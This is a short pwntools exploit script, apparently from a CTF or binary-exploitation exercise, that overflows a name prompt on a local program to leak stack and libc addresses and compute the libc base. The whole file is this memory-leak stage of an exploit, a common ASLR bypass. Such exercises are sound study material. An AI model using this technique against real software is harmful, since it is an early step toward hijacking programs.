from pwn import *

p = process('./../bin/program-2')

p.recvuntil('Input your name --> ')

p.send('A'*32)

data = str(p.recv(0x100).hex()).split('41'*32)[1]
# print(data)

log.info("Stack addr: 0x%s" % data[24:36])
log.info("libc addr: 0x%s" % data[:12])

offset = 0x3F1000

log.info("base_libc addr: %s" % hex(int(data[:12], 16) + offset))